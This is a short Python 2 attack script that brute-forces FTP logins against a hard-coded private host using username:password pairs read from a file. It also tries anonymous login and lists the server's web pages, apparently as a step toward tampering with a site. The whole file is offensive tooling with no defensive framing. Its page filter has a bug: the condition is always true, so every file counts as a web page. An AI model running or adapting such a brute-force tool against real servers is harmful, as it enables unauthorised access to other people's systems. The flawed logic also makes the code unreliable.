import ftplib

def bruteLogin(hostname,file):
	pF = open(file, 'r')
	for line in pF.readlines():			 
		uname=line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print "[+] Trying: "+uname+"/"+passWord
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(uname, passWord)
			print '\n[*] ' + str(hostname) +' FTP with '+uname+' and password '+passWord+' Logon Succeeded.'
			returnDefault(ftp)
			ftp.quit()
			return True
		except:
			pass
	print '\n[-] Could not brute force FTP credentials.'
	return (None, None)
	
def anonLogin(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('anonymous', 'me@your.com')
		print '\n[*] ' + str(hostname) +' FTP Anonymous Logon Succeeded.'
		ftp.quit()
		return True
	except Exception, e:
		print '\n[-] ' + str(hostname) +' FTP Anonymous Logon Failed.'
		return False

def returnDefault(ftp):
	print 'here'
	try:
		dirList = ftp.nlst()
	except:
		dirList = []
		print '[-] Could not list directory contents.'
		print '[-] Skipping To Next Target.'
		return
	retList = []
	for fileName in dirList:
		fn = fileName.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn or '.html' in fn or '.aspx':
			print '[+] Found default page: ' + fileName
			retList.append(fileName)
	return retList

def main():
	host = '192.168.1.94'
	#anonLogin(host)
	bruteLogin(host,'ftplogins.txt')

if __name__ == '__main__':
	main()